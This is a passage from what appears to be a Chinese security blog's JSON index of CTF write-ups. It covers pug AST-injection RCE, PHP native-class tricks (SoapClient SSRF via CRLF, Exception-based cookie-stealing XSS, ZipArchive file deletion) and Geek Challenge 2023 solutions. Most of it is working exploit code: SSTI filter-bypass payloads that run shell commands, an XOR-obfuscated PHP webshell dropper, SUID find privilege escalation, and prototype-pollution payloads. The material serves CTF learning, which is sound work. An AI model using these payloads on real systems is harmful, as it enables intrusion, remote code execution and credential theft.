注意第4步解析 node.Type 为 Code 类型，会执行如下代码： 12345case 'Code': case 'While': if (ast.block) { // 注意这里 ast.block = walkAST(ast.block, before, after, options); } 判断 ast.block 属性是否存在，此处的 ast 即当前ast语法树的节点 如果存在，继续递归解析 block 结合原型链污染如果某处存在原型链污染漏洞，使得 1Object.prototype.block = {&quot;type&quot;:&quot;Text&quot;,&quot;val&quot;:`&lt;script&gt;alert(origin)&lt;/script&gt;`}; 那么 ast.block 就会访问到 ast.__proto__.block ，即Object.prototype.block 的属性 此时代码输出结果，导致了XSS 12345678910const pug = require('pug');Object.prototype.block = {&quot;type&quot;:&quot;Text&quot;,&quot;val&quot;:`&lt;script&gt;alert(origin)&lt;/script&gt;`};const source = `h1= msg`;var fn = pug.compile(source, {});var html = fn({msg: 'It works'});console.log(html); // &lt;h1&gt;It works&lt;script&gt;alert(origin)&lt;/script&gt;&lt;/h1&gt; RCE我们知道pug本质上是将一段代码，如 h1 =msg 编译为一段js代码，背后其实就是生成语法树+ new Function 因此如果能通过AST Injection插入节点，并使之成为代码，即可达到远程代码执行的目的。 刚好pug中就有如下代码： 12345678910// /node_modules/pug-code-gen/index.js if (debug &amp;&amp; node.debug !== false &amp;&amp; node.type !== 'Block') { if (node.line) { var js = ';pug_debug_line = ' + node.line; if (node.filename) js += ';pug_debug_filename = ' + stringify(node.filename); this.buf.push(js + ';'); } } 那么我们通过 AST Injection + Prototype Pollution 即可实现RCE 12345678910const pug = require('pug');Object.prototype.block = {&quot;type&quot;:&quot;Text&quot;,&quot;line&quot;:`console.log(process.mainModule.require('child_process').execSync('id').toString())`};const source = `h1= msg`;var fn = pug.compile(source, {});var html = fn({msg: 'It works'});console.log(html);","link":"/2023/11/18/Ast_Jnigection/"},{"title":"PHP_原生类利用","text":"前言总结php中反序列化时会用到的原生类；php中内置很多原生的类，在CTF中常以echo new $a($b);这种形式出现，当看到这种关键字眼时，就要考虑本题是不是需要原生类利用了。 目录遍历类DirectoryIterator这个类会创建一个指定目录的迭代器，当遇到echo输出时会触发Directorylterator中的__toString()方法，输出指定目录里面经过排序之后的第一个文件名，而一般情况第一个文件都是点号。没什么用，但是Directorylterator可以配合glob协议使用；与glob://协议结合将无视open_basedir对目录的限制 12345678&lt;?phpecho new DirectoryIterator(&quot;./&quot;);echo &quot;\\n&quot;;echo new DirectoryIterator(&quot;glob://f*&quot;);?&gt;#.#flag FilesystemIterator该类继承于Directorylterator，所以在用法上基本也是一样的。 GlobIterator通过类名也不难看出，这是个自带glob协议的类，所以调用时就不必再加上glob://了 12345&lt;?phpecho new GlobIterator(&quot;./f*&quot;);?&gt;#flag 文件读取类SplFileObject当用文件目录遍历到了敏感文件时，可以用SplFileObject类，同样通过echo触发SplFileObject中的__toString()方法。(该类不支持通配符，所以必须先获取到完整文件名称才行) 除此之外其实SplFileObject类，只能读取文件的第一行内容，如果想要全部读取就需要用到foreach函数，但若题目中没有给出foreach函数的话，就要用伪协议读取文件的内容 12345&lt;?phpecho new SplFileObject(&quot;./flag.php&quot;);echo &quot;\\n&quot;;echo new SplFileObject(&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;);?&gt; 输出如下: 123&lt;?phpPD9waHANCiRmbGFnID0gImZsYWd7ekl4eWRfaXNfaGFja2VyfSI7DQo/Pg== base64解码： 123&lt;?php$flag = &quot;flag{zIxyd_is_hacker}&quot;;?&gt; 报错类Error/ExceptionERROR 适用于php7版本Error类就是php的一个内置类用于自动自定义一个Error，它内置有一个toString的方法。EXCEPTION 适用于php5、7版本这个类利用的方式和原理和Error 类一模一样，但是适用于php5和php7，相对之下更加好用 Error/Exception_XSS[BJDCTF 2nd]xss之光 扫后台，有.git 泄露,githack下载下来 123&lt;?php$a = $_GET['yds_is_so_beautiful'];echo unserialize($a); 源码只有这三行；可触发序列化中的魔术方法__toString 1234567891011121314151617&lt;?php$y1ng = new Exception(&quot;&lt;script&gt;window.open('url/?'+document.cookie);&lt;/script&gt;&quot;);echo urlencode(serialize($y1ng));?&gt;//window.open 是 javaScript 打开新窗口的方法#也可以用window.location.href='url'来实现恶意跳转&lt;?php$a = new Exception(&quot;&lt;script&gt;window.location.href='url'+document.cookie&lt;/script&gt;&quot;);echo urlencode(serialize($a));?&gt;#或者用alert(document.cookie)直接弹出cookie，但此题不行，可能开了httponly。&lt;?php$y1ng = new Exception(&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;);echo urlencode(serialize($y1ng));?&gt; flag就在cookies中 Error/Exception_绕过哈希比较12345678910111213141516171819&lt;?php$a = new Exception(&quot;deadbeef&quot;,1);$b = new Exception(&quot;deadbeef&quot;,2);echo $a;echo &quot;\\n&quot;;echo $b;echo &quot;\\n&quot;;if($a != $b){ echo &quot;a!=b&quot;.&quot;\\n&quot;;}if(md5($a) === md5($b)){ echo &quot;md5相等&quot;.&quot;\\n&quot;;}if(sha1($a)=== sha1($b)){ echo &quot;sha1相等&quot;;}?&gt; 123456789Exception: deadbeef in E:\\phpstudy\\phpstudy_pro\\WWW\\test.php:2Stack trace:#0 {main}Exception: deadbeef in E:\\phpstudy\\phpstudy_pro\\WWW\\test.php:2Stack trace:#0 {main}a!=bmd5相等sha1相等 当变量a,b同时触发__toString()方法时，虽对象不同，但执行__toString()方法后，返回结果相同；这里需要注意a,b赋值时，必须要在同一行上，因为执行__toString()方法时会返回行号。虽然强碰撞也可以绕过，但是还是不如用报错类绕过的好，强碰撞绕过的字符非常长，如果对字符长度做了限制的话可以考虑利用报错类绕过哈希比较 其他类ReflectionMethod 获取类方法的相关信息可以结合getDocComment() 方法，用它来获取类中各个函数注释内容 123456789101112131415&lt;?phphighlight_file(__FILE__);error_reporting(0);class Sentiment{ /** flag{zIxyd_is_hacker} */public function a(){ }}$a = $_GET['a'];$b = $_GET['b'];$c= $_GET['c'];$d=new $a($b,$c);var_dump($d-&gt;getDocComment());?&gt; 12http://127.0.0.1/test.php?a=ReflectionMethod&amp;b=Sentiment&amp;c=a#E:\\phpstudy\\phpstudy_pro\\WWW\\test.php:14: string(28) &quot;/** flag{zIxyd_is_hacker} */&quot; SoapClient 类进行 SSRFPHP 的内置类 SoapClient 是一个专门用来访问web服务的类，SOAP 协议是一种基于 XML 的协议,用于在 Web 应用程序之间进行交互，主要用于 Web 服务;WSDL:是一种 XML 文档，用于描述 Web 服务。 该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。 该类的构造函数如下： 1public SoapClient :: SoapClient(mixed $wsdl [，array $options ]) 第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。 123456&lt;?php$a = new SoapClient(null,array('uri'=&gt;'zIxy', 'location'=&gt;'http://81.71.13.76:6666/'));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function(); 1234567891011ubuntu@zIxyd:~$ nc -lnnp 6666POST / HTTP/1.1Host: 81.71.13.76:6666Connection: Keep-AliveUser-Agent: PHP-SOAP/7.3.4Content-Type: text/xml; charset=utf-8SOAPAction: &quot;zIxy#not_exists_function&quot;Content-Length: 383&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;zIxy&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:not_exists_function/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; 从结果我们可以看到SOAPAction参数可控，我们可以在SOAPAction处注入恶意的换行，这样一来我们POST提交的header就是可控的，我们就可以通过注入来执行我们想要执行的操作了。 尝试传入token,发现新的问题，Content-Type在SOAPAction的上面，就无法控制Content-Type,也就不能控制POST的数据 在header里User-Agent在Content-Type前面，通过user_agent同样可以注入CRLF,控制Content-Type的值 CRLF Injection 尝试控制token 12345678910111213141516&lt;?php$target = 'http://81.71.13.76:6666';$post_string = 'token=ly0n';$headers = array( 'X-Forwarded-For: 127.0.0.1', );$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'zIxyd^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace('^^',&quot;\\r\\n&quot;,$aaa);$aaa = str_replace('&amp;','&amp;',$aaa);echo $aaa;$c = unserialize($aaa);$c-&gt;not_exists_function();?&gt; 12345678910111213141516ubuntu@zIxyd:~$ nc -lnnp 6666POST / HTTP/1.1Host: 81.71.13.76:6666Connection: Keep-AliveUser-Agent: zIxydContent-Type: application/x-www-form-urlencodedX-Forwarded-For: 127.0.0.1Content-Length: 11token=zIxydContent-Type: text/xml; charset=utf-8SOAPAction: &quot;aaab#not_exists_function&quot;Content-Length: 383&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;aaab&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:not_exists_function/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; 成功控制 使用SoapClient反序列化+CRLF可以生成任意POST请求。 1Deserialization + __call + SoapClient + CRLF = SSRF SoapClient__Examplectfshow_web259 hint： 1234567891011121314#flag.php$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);array_pop($xff);$ip = array_pop($xff);if($ip!=='127.0.0.1'){ die('error');}else{ $token = $_POST['token']; if($token=='ctfshow'){ file_put_contents('flag.txt',$flag); }} 源码： 123456789#index.php&lt;?phphighlight_file(__FILE__);$vip = unserialize($_GET['vip']);//vip can get flag one key$vip-&gt;getFlag(); 目的是在index.php通过反序列化一个原生类向flag.php发送请求，然后flag.php用file_put_contents把flag放到flag.txt里 exp 1234567891011&lt;?php$target = 'http://127.0.0.1/flag.php';$post_string = 'token=ctfshow';$b = new SoapClient(null,array('location' =&gt; $target, 'user_agent'=&gt;'zIxyd^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'. '^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string, 'uri'=&gt; &quot;zIxyd&quot;));$a = serialize($b);$a = str_replace('^^',&quot;\\r\\n&quot;,$a);echo urlencode($a);?&gt; ZipArchive 类来删除文件 适用于PHP 5 &gt;= 5.2.0, PHP 7, PHP 8, PECL zip &gt;= 1.1.0 一个用 Zip 压缩的文件存档。 可以通过本类执行一些文件操作，在CTF可以用来删除waf 常用类方法： 12345678ZipArchive::addEmptyDir：添加一个新的文件目录ZipArchive::addFile：将文件添加到指定zip压缩包中ZipArchive::addFromString：添加新的文件同时将内容添加进去ZipArchive::close：关闭ziparchiveZipArchive::extractTo：将压缩包解压ZipArchive::open：打开一个zip压缩包ZipArchive::deleteIndex：删除压缩包中的某一个文件，如：deleteIndex(0)代表删除第一个文件ZipArchive::deleteName：删除压缩包中的某一个文件名称，同时也将文件删除 实例代码： 1234&lt;?php$zip = new ZipArchive;$zip-&gt;open('filename', ZipArchive::CREATE)?&gt; 该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。 12345678filename：要打开的ZIP存档的文件名。flags：用于打开档案的模式。有以下几种模式：ZipArchive::OVERWRITE：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。ZipArchive::CREATE：如果不存在则创建一个zip压缩包。ZipArchive::RDONLY：只读模式打开压缩包。ZipArchive::EXCL：如果压缩包已经存在，则出错。ZipArchive::CHECKCONS：对压缩包执行额外的一致性检查，如果失败则显示错误。注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到cons ZipArchive_Example新建一个waf.txt文件，内容如下 1this_is_test 新建一个test.php文件，内容如下 1234567891011121314151617181920212223242526272829&lt;?phphighlight_file(__FILE__);error_reporting(0);class zIxyd { public $object; public $filename; public $content; public $code; public function __destruct() { echo &quot;Can you hack me?&quot;; $this-&gt;object-&gt;open($this-&gt;filename,$this-&gt;content); if(!file_get_contents(&quot;waf.txt&quot;)){ eval($this-&gt;code); }else{ echo file_get_contents(&quot;waf.txt&quot;); } }}$code = $_POST['code'];if(isset($code)){ unserialize($code);}else{ echo &quot;Please input your code&quot;;} 代码很明显，只有不存在waf.txt文件，即可rce; 存在open函数，通过ZipArchive直接调用open方法删除目标机上的文件 poc: 12345678910111213141516&lt;?phpclass zIxyd { public $object; public $filename; public $content; public $code;}$a = new zIxyd();$a -&gt;object = new ZipArchive();$a -&gt;filename = &quot;waf.txt&quot;;$a -&gt;content = ZipArchive::OVERWRITE;$a -&gt;code = &quot;phpinfo();&quot;;echo serialize($a);","link":"/2023/11/20/PHP_%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/"},{"title":"Geek Challenge 2023","text":"前言记录一些在Geek Challenge 2023比赛中的wp；一部分写的比较详细，一部分写的比较简单，根据题目的难易度来的； klf_2源码再比赛中是看不到源码的，是我后来可以rce后，cat app.py得到源码的，为了方便写wp，就贴一下 1234567891011121314151617181920212223242526272829from flask import Flask, request, render_template, render_template_string,send_from_directoryimport re import os app = Flask(__name__) @app.route('/', methods=['GET', 'POST']) def index(): return render_template('index.html') @app.route('/secr3ttt', methods=['GET', 'POST']) def secr3t(): klf = request.args.get('klf', '') template = f''' &lt;html&gt; &lt;body&gt; &lt;h1&gt;别找了，这次你肯定是klf&lt;/h1&gt; &lt;/body&gt; &lt;img src=&quot;https://image-obsidian-1317327960.cos.ap-chengdu.myqcloud.com/obisidian- blog/0071088CAC91D2C42C4D31053A7E8D2B731D69.jpg&quot; alt=&quot;g&quot;&gt; &lt;h1&gt;%s&lt;/h1&gt; &lt;/html&gt; &lt;!--klf?--&gt; &lt;!-- 别想要flag？klf --&gt; ''' bl = ['_', '\\\\', '\\'', '&quot;', 'request', &quot;+&quot;, 'class', 'init', 'arg', 'config', 'app', 'self', 'cd', 'chr', 'request', 'url', 'builtins', 'globals', 'base', 'pop', 'import', 'popen', 'getitem', 'subclasses', '/', 'flashed', 'os', 'open', 'read', 'count', '*', '38', '124', '47', '59', '99', '100', 'cat', '~', ':', 'not', '0', '-', 'ord', '37', '94', '96', '[',']','index','length']#'43', '45', for i in bl: if i in klf: return render_template('klf.html') a = render_template_string(template % klf) if &quot;{&quot; in a: return a + render_template('win.html') return a @app.route('/robots.txt', methods=['GET']) def robots(): return send_from_directory(os.path.join(app.root_path, 'static'), 'robots.txt', mimetype='text/plain') if __name__ == '__main__': app.run(host='0.0.0.0', port=7889, debug=False 黑名单过滤了一大部分关键字和关键符号。但是没有.，join过滤器，dict，= ，()，set,|,attr.还是有机可乘的 构造关键字这一部分就是构造出关键字 1().__class__.__base__.__subclasses__().__getitem__(xx).__init__.__globals__['popen'](xx).read() 12345678910{% set po=dict(po=a,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(24)%}{% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%}{% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%}{% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%}{% set bs=(a,a,dict(bas=a,e=b)|join,a,a)|join()%}{% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%}{% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%}{%set pp=dict(po=a,pen=b)|join %}{% set re=dict(re=a,ad=b)|join%} 构造cmd再上一步的基础上，构造ls： 123456789101112131415{% set po=dict(po=a,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(24)%}{% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%}{% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%}{% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%}{% set bs=(a,a,dict(bas=a,e=b)|join,a,a)|join()%}{% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%}{% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%}{%set pp=dict(po=a,pen=b)|join %}{% set re=dict(re=a,ad=b)|join%}{% set ls=dict(l=a,s=b)|join%}{%print(()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(ls)|attr(re)())%}#app.py hahahaha requirements.txt static templates 看到flag没有再当前目录下，尝试构造 ls /,这时候就需要在上一步的基础上，需要构造空格和反斜杠字符 ,/, 构造空格空格很容易构造，在()|select|string|list)就有许多空格，,这里大概解释一下**()|select|string|list)**这种形式是什么意思，管道符，前一个输出当作后一个输入，就像list(string(select(()))) 构造反斜杠思路一()|select|string|list)中没有反斜杠，那么就想一下：还有其他关键字可以以这种形式构造字符吗？，而其他关键字构造的字符下可能有我们需要的反斜杠，答案是肯定的 还有很多 config|string|list request|string|list lipsum|string|list …… 比如config和request下就有反斜杠，但是被黑名单了，我这里暂时还没有找到其他不太黑名单下有可以构造反斜杠的，只能换思路了 思路二利用格式字符串得到反斜杠， 1234{%set fxg=(&quot;%c&quot;%(47))%}{%print(fxg)%}#/ 要利用格式字符串需要用到百分号，那么需要构造百分号:将字符url编码取第一个字符，第一个字符肯定是%, 1{% set bfh = ()|select|string|urlencode|first %} 而然并没有我想的那么简单，url居然被过滤了，这种思路又无法用了 思路三回顾一下， 我们是想要得到反斜杠； 我们已经可以在当前目录下执行命令了，上面展示的就有ls； 突然想起来当前目录有app.py文件，用的是flask框架，肯定会有路由，有路由肯定会用到反斜杠;现在思路比较简单了：从app.py文件中得到反斜杠； 列如下段flask代码中肯定会存在反斜杠： 123@app.route('/', methods=['GET', 'POST']) def index(): return render_template('index.html') 需要cat app.py,字母和空格都有了，现在构造.又成了一个难点，但还是有方法的 12345678{%print(g)%}#&lt;flask.g of 'app'&gt;{% set po=dict(po=a,p=b)|join%} {% set dian=(g|string|list)|attr(po)(6)%}{%print(dian)%}#. ok，这样所需要的字符都构造出来了，剩下的就是利用了 exp123456789101112131415161718192021222324252627{% set po=dict(po=a,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(24)%}{% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%}{% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%}{% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%}{% set bs=(a,a,dict(bas=a,e=b)|join,a,a)|join()%}{% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%}{% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%}{%set pp=dict(po=a,pen=b)|join %}{% set re=dict(re=a,ad=b)|join%}{% set kon=(()|select|string|list)|attr(po)(17)%} {% set dian=(g|string|list)|attr(po)(6)%} {% set qian=dict(p=a)|join%}{% set hou=dict(p=a,y=b)|join%}{% set ming=(kon,kon,dict(ap=a,p=b)|join,dian,hou)|join()%}{% set cmd=(dict(ca=a,t=b)|join,ming)|join()%}{% set a=()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)()%}{% set bb=(a|string|list)|attr(po)(246)%}{% set ho=(dict(ap=a,p=b))|join%}{% set fl=(dict(fl4gfl4g=a,fl4g=b))|join%}{% set cmd=(dict(ca=a,t=b)|join,kon,bb,ho,bb,fl)|join%}{%print(()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)())%} EzRce123456789101112&lt;?phpinclude('waf.php');session_start();show_source(__FILE__);error_reporting(0);$data=$_GET['data'];if(waf($data)){ eval($data);}else{ echo &quot;no!&quot;;}?&gt; 先用bp fuzz一下，看看过滤了什么，发现异或符号没有过滤，而且有几个字母没有过滤 下面是上了木马才得到源码的 12345678910&lt;?phpfunction waf($data){ if(preg_match('/[b-df-km-uw-z0-9\\+\\~\\{\\}]+/i',$data)){ return False; }else{ return True; }} 异或上🐎因为没有过滤异或所以构造phpinfo(); : (“^@^@@[@”^”.(.).=/“)(); 发现是可以成功显示phpinfo内容，但是查看disable_functions禁用了一些函数，但是没有禁用file_put_contents函数，尝试写一句话木马上去 123file_put_content(&quot;lll.php&quot;,&quot;&lt;?php eval($_POST[1])?&gt;&quot;)(&quot;AAAAaL*VaAAAVAAVL&quot;^&quot;'(-$&gt;&lt;_\\&quot;&gt;\\&quot;./\\&quot;$/\\&quot;?&quot;)(&quot;lll&quot;.&quot;.&quot;.(&quot;LAL&quot;^&quot;&lt;)&lt;&quot;),(&quot;aaLALaaAVAAvaalalvelaleaa&quot;^&quot;]^&lt;)&lt;A!$ -^E&gt;&lt;.?\\&quot;&gt;]&lt;E^^_&quot;)); 发现也是成功上传了木马，用蚁剑连shell(这里有一个坑,https没有成功，用http代替就可以了) 提权可以看到flag就在根目录下，但是没有权限读取，whoami 查看当前用户www-data，去网上搜一次关于提权的知识， 提权的方法有很多，这道题考的是find提权， 123456789which find #/usr/bin/findls /usr/bin/find -l#-rwsr-xr-x. 1 root root 315904 Feb 16 2019 /usr/bin/find#这里发现有s权限 s:suodsetuid：该位是让普通用户可以以root用户的角色运行只有root帐号才能运行的程序或命令 find /etc/passwd -exec cat /flag \\; #find 一个必须存在的文件 -exec 有执行的命令 \\; 到这里flag就已经到手了，踩了很多坑，还有一些坑没有写上了，也是拿了一个三血，下面是异或的脚本 123456789101112131415valid = &quot;alevALEV!@$%^*()[];\\'\\&quot;,.&lt;&gt;/?-=_` &quot;answer = str(input(&quot;请输入进行异或构造的字符串：&quot;))# answer = &quot;//\\/\\/&quot;tmp1, tmp2 = '', ''for c in answer: for i in valid: for j in valid: if (ord(i) ^ ord(j) == ord(c)): tmp1 += i tmp2 += j break else: continue break ezpython源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102import jsonimport osfrom waf import wafimport importlibfrom flask import Flask,render_template,request,redirect,url_for,session,render_template_stringapp = Flask(__name__)app.secret_key='jjjjggggggreekchallenge202333333'class User(): def __init__(self): self.username=&quot;&quot; self.password=&quot;&quot; self.isvip=Falseclass hhh(User): def __init__(self): self.username=&quot;&quot; self.password=&quot;&quot;registered_users=[]@app.route('/')def hello_world(): # put application's code here return render_template(&quot;welcome.html&quot;)@app.route('/play')def play(): username=session.get('username') if username: return render_template('index.html',name=username) else: return redirect(url_for('login'))@app.route('/login',methods=['GET','POST'])def login(): if request.method == 'POST': username=request.form.get('username') password=request.form.get('password') user = next((user for user in registered_users if user.username == username and user.password == password), None) if user: session['username'] = user.username session['password']=user.password return redirect(url_for('play')) else: return &quot;Invalid login&quot; return redirect(url_for('play')) return render_template(&quot;login.html&quot;)@app.route('/register',methods=['GET','POST'])def register(): if request.method == 'POST': try: if waf(request.data): return &quot;fuck payload!Hacker!!!&quot; data=json.loads(request.data) if &quot;username&quot; not in data or &quot;password&quot; not in data: return &quot;连用户名密码都没有你注册啥呢&quot; user=hhh() merge(data,user) registered_users.append(user) except Exception as e: return &quot;泰酷辣,没有注册成功捏&quot; return redirect(url_for('login')) else: return render_template(&quot;register.html&quot;)@app.route('/flag',methods=['GET'])def flag(): user = next((user for user in registered_users if user.username ==session['username'] and user.password == session['password']), None) if user: if user.isvip: data=request.args.get('num') if data: if '0' not in data and data != &quot;123456789&quot; and int(data) == 123456789 and len(data) &lt;=10: flag = os.environ.get('geek_flag') return render_template('flag.html',flag=flag) else: return &quot;你的数字不对哦!&quot; else: return &quot;I need a num!!!&quot; else: return render_template_string('这种神功你不充VIP也想学?&lt;p&gt;&lt;img src=&quot;{{url_for(\\'static\\',filename=\\'weixin.png\\')}}&quot;&gt;要不v我50,我送你一个VIP吧,嘻嘻&lt;/p&gt;') else: return &quot;先登录去&quot;def merge(src, dst): for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)if __name__ == '__main__': app.run(host=&quot;0.0.0.0&quot;,port=&quot;8888&quot;) 考察原型链污染和python的int函数漏洞，其实int不止在python里有这个漏洞，其他语言也有，比如php也有； 标志着原型链污染 1234567891011def merge(src, dst): for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) 虽然代码一共有100多行，但是整个代码的逻辑和实现的功能是非常简单易懂的 使得hhh类的isvip为真，但是hhh没有isvip属性，很明显就是需要污染hhh类， example先看一个python原型链污染的简单案例吧 1234567891011121314151617181920212223242526272829303132333435363738394041class father: secret = &quot;haha&quot;class son_a(father): passclass son_b(father): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = son_b()payload = { &quot;__class__&quot; : { &quot;__base__&quot; : { &quot;secret&quot; : &quot;no way&quot; } }}print(son_a.secret)#hahaprint(instance.secret)#hahamerge(payload, instance)print(son_a.secret)#no wayprint(instance.secret)#no way pollute然后下面是我自己本地测试的结果 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import jsonclass User(): def __init__(self): self.username=&quot;aa&quot; self.password=&quot;bb&quot; self.isvip=0class hhh(User): def __init__(self): self.username=&quot;cc&quot; self.password=&quot;dd&quot;def merge(src, dst): for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)user = hhh()#payload = '''{&quot;username&quot;: &quot;test&quot;,&quot;password&quot;: &quot;test002&quot;,&quot;\\u0069\\u0073\\u0076\\u0069\\u0070&quot; : &quot;111&quot;}'''payload = json.loads(payload)print(payload)print(user.username)print(user.password)merge(payload, user)print(user.username)print(user.password)print(user.isvip) 这里用unicode编码绕过waf，json.load会自动进行unicode解码， 绕后就是绕过 1if '0' not in data and data != &quot;123456789&quot; and int(data) == 123456789 and len(data) &lt;=10: 这里比较简单了用空格或者字符“+”或者0，这里将0禁止了用前面两者就行， 123?=%20123456789或者?=+123456789 雨根据hint secret_key是出题人的id:VanZY(我当时没看hint，用脚本也可以爆破出来)，然后伪造jwt，得到源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677const express = require('express');const jwt = require('jsonwebtoken');const app = express();const bodyParser = require('body-parser')const path = require('path');const jwt_secret = &quot;VanZY&quot;;const cookieParser = require('cookie-parser');const putil_merge = require(&quot;putil-merge&quot;)app.set('views', './views');app.set('view engine', 'ejs');app.use(cookieParser());app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json())var Super = {};var safecode = function (code){ let validInput = /global|mainModule|import|constructor|read|write|_load|exec|spawnSync|stdout|eval|stdout|Function|setInterval|setTimeout|var|\\+|\\*/ig; return !validInput.test(code);};app.all('/code', (req, res) =&gt; { res.type('html'); if (req.method == &quot;POST&quot; &amp;&amp; req.body) { putil_merge({}, req.body, {deep:true}); } res.send(&quot;welcome to code&quot;);});app.all('/hint', (req, res) =&gt; { res.type('html'); res.send(&quot;I heard that the challenge maker likes to use his own id as secret_key&quot;);});app.get('/source', (req, res) =&gt; { res.type('html'); var auth = req.cookies.auth; jwt.verify(auth, jwt_secret , function(err, decoded) { try{ if(decoded.user==='admin'){ res.sendFile(path.join(__dirname + '/index.js')); }else{ res.send('you are not admin &lt;!--Maybe you can view /hint--&gt;'); } } catch{ res.send(&quot;Fuck you Hacker!!!&quot;) } });});app.all('/create', (req, res) =&gt; { res.type('html'); if (!req.body.name || req.body.name === undefined || req.body.name === null){ res.send(&quot;please input name&quot;); }else { if (Super['userrole'] === 'Superadmin') { res.render('index', req.body); }else { if (!safecode(req.body.name)) { res.send(&quot;你在做什么？快停下！！！&quot;) } else{ res.render('index', {name: req.body.name}); } } }});app.get('/',(req, res) =&gt; { res.type('html'); var token = jwt.sign({'user':'guest'},jwt_secret,{ algorithm: 'HS256' }); res.cookie('auth ',token); res.end('Only admin can get source in /source');});app.listen(3000, () =&gt; console.log('Server started on port 3000')); 代码比较简单，一看就是需要某种权限才能执行某些命令，nodejs原型链污染的老套路了 12if (Super['userrole'] === 'Superadmin') { res.render('index', req.body); 在这里，需要Super[‘userrole’]的值为Superadmin，但是整个代码也没有涉及到可以让Super[‘userrole’]的值为Superadmin的地方，但是凭空多出来一个code路由，putil_merge函数和merge函数，基本可以确定这里有问题了 1234567app.all('/code', (req, res) =&gt; { res.type('html'); if (req.method == &quot;POST&quot; &amp;&amp; req.body) { putil_merge({}, req.body, 